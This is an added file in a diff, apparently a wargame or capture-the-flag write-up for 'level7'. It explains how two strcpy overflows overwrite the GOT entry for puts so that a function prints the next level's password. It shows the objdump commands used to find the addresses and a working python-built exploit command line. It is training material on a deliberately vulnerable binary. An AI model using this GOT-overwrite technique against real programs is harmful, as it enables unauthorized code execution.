@@ -1,0 +1,28 @@
+In this exploit, we're going through what we've seen before with the exploits.
+
+We have 2 strcpys and a m function which prints the c global variable, stocking the pass for level 8.
+
+Through the 2 strcpy we're going to exploit the puts address to call the m function instead, because the puts call is at the bottom of the program, after the fgets which gets the pass into c.
+
+In order to do this, we fust find the buffer size, the m address, the puts address in the GOT table and understand the behavior of the program.
+
+We need 2 args, either way it segfaults, by looking and testing we find that the buffer size is 20.
+We fust fill the buffer with 20 randoms characters.
+
+Then, we look for the puts address :
+
+ objdump -R level7
+
+ 08049928 R_386_JUMP_SLOT   puts
+
+ then the m address
+
+ objdump -t level7
+
+ 080484f4 g     F .text  0000002d              m
+
+ ok we need to build the exploit
+
+ So it will be buffer fill *20 + puts addr + m addr like we did in level5
+
+ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
